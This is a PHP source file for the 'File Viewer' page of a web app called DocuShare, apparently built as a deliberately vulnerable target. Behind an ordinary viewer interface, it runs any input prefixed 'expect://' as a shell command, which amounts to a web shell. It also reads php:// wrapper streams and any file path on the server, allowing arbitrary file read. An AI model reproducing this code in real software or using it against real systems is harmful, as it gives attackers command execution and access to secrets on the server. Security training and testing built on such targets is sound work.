<?php
require_once 'config.php';
require_login();

$file = $_GET['file'] ?? '';
$content = '';
$error = '';
$is_image = false;

if (!empty($file)) {
    try {
        if (strpos($file, 'expect://') === 0) {
            $cmd = substr($file, strlen('expect://'));
            $content = shell_exec($cmd . ' 2>&1');
            if ($content === null) $content = '';
        } elseif (strpos($file, 'php://filter') === 0 || strpos($file, 'php://') === 0) {
            $content = @file_get_contents($file);
            if ($content === false) $error = 'Unable to read resource.';
        } elseif (preg_match('/\.(jpg|jpeg|png|gif|webp)$/i', $file)) {
            $is_image = true;
        } else {
            $paths = [$file, '/var/www/html/' . $file, '/' . ltrim($file, '/')];
            $read = false;
            foreach ($paths as $p) {
                if (file_exists($p)) {
                    $content = file_get_contents($p);
                    $read = true;
                    break;
                }
            }
            if (!$read) {
                $content = @file_get_contents($file);
                if ($content === false) $error = 'File not found or permission denied.';
            }
        }
    } catch (Exception $e) {
        $error = 'Error reading file.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Viewer - DocuShare</title>
    <link rel="stylesheet" href="/assets/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous">
</head>
<body class="app-page">
    <aside class="sidebar" id="sidebar">
        <div class="sidebar-brand">
            <i class="fas fa-layer-group"></i>
            <span>DocuShare</span>
        </div>
        <nav class="sidebar-nav">
            <div class="nav-section">
                <span class="nav-section-label">Main</span>
                <a href="/dashboard.php" class="nav-item">
                    <i class="fas fa-home"></i> Dashboard
                </a>
                <a href="/upload.php" class="nav-item">
                    <i class="fas fa-cloud-upload-alt"></i> Upload Files
                </a>
                <a href="/view.php" class="nav-item active">
                    <i class="fas fa-eye"></i> File Viewer
                </a>
                <a href="/profile.php" class="nav-item">
                    <i class="fas fa-user-circle"></i> Profile
                </a>
            </div>
            <div class="nav-section">
                <a href="/logout.php" class="nav-item nav-danger">
                    <i class="fas fa-sign-out-alt"></i> Sign Out
                </a>
            </div>
        </nav>
        <div class="sidebar-user">
            <div class="user-avatar"><?php echo strtoupper(substr($_SESSION['username'], 0, 1)); ?></div>
            <div class="user-info">
                <span class="user-name"><?php echo sanitize($_SESSION['username']); ?></span>
                <span class="user-role">Member</span>
            </div>
        </div>
    </aside>

    <main class="main-content">
        <header class="top-bar">
            <div class="top-bar-left">
                <button class="sidebar-toggle" onclick="document.getElementById('sidebar').classList.toggle('collapsed')">
                    <i class="fas fa-bars"></i>
                </button>
                <div class="breadcrumb">
                    <a href="/dashboard.php">Dashboard</a>
                    <i class="fas fa-chevron-right"></i>
                    <span>File Viewer</span>
                </div>
            </div>
        </header>

        <div class="page-content">
            <div class="page-header">
                <h1><i class="fas fa-eye"></i> File Viewer</h1>
                <p>Preview files from your workspace or enter a file path directly.</p>
            </div>

            <div class="content-card glass">
                <form method="GET" action="/view.php" class="viewer-form">
                    <div class="form-row" style="align-items:flex-end; gap:1rem">
                        <div class="form-group" style="flex:1">
                            <label for="file-path">
                                <i class="fas fa-folder-open"></i> File Path or Resource
                            </label>
                            <input
                                type="text"
                                id="file-path"
                                name="file"
                                value="<?php echo htmlspecialchars($file); ?>"
                                placeholder="e.g. uploads/myfile.svg"
                                autocomplete="off"
                            >
                        </div>
                        <button type="submit" class="btn btn-primary" id="view-btn">
                            <i class="fas fa-eye"></i> View File
                        </button>
                    </div>
                </form>
            </div>

            <?php if (!empty($file)): ?>
            <div class="content-card glass">
                <div class="card-header">
                    <h2>
                        <i class="fas fa-file-alt"></i>
                        <?php echo htmlspecialchars($file); ?>
                    </h2>
                    <?php if (!empty($content)): ?>
                    <button onclick="copyContent()" class="btn btn-sm btn-outline">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                    <?php endif; ?>
                </div>

                <?php if ($error): ?>
                    <div class="alert alert-error">
                        <i class="fas fa-exclamation-circle"></i> <?php echo sanitize($error); ?>
                    </div>
                <?php elseif ($is_image): ?>
                    <div class="image-preview">
                        <img src="/<?php echo htmlspecialchars($file); ?>" alt="Preview" style="max-width:100%; border-radius:8px">
                    </div>
                <?php elseif (!empty($content)): ?>
                    <div class="file-content-wrapper">
                        <pre id="file-content" class="file-content"><?php echo htmlspecialchars($content); ?></pre>
                    </div>
                <?php else: ?>
                    <div class="alert alert-warning">
                        <i class="fas fa-exclamation-triangle"></i>
                        File not found or cannot be read.
                    </div>
                <?php endif; ?>
            </div>
            <?php endif; ?>
        </div>
    </main>

    <script>
    function copyContent() {
        const content = document.getElementById('file-content');
        if (content) {
            navigator.clipboard.writeText(content.textContent).then(() => {
                alert('Copied to clipboard!');
            });
        }
    }
    </script>
</body>
</html>
